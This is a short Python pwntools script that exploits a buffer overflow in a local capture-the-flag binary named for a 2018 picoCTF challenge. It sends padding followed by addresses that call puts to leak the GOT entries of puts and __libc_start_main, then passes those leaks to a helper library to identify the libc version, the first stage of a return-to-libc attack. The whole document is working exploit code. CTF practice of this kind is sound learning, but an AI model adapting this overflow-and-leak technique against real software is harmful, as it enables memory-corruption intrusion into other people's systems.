from pwn import *

import TheNight

import sys

target = process("./chall-test_localLibcId-pico18-bof1")
payload = ""
payload += "00000000000000000000000000000000000000000000"
payload += p32(0x8048460)
payload += p32(0x8048460)
payload += p32(0x804a01c)
payload += p32(0x804a024)
target.sendline(payload)
target.recvline()
target.recvline()
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
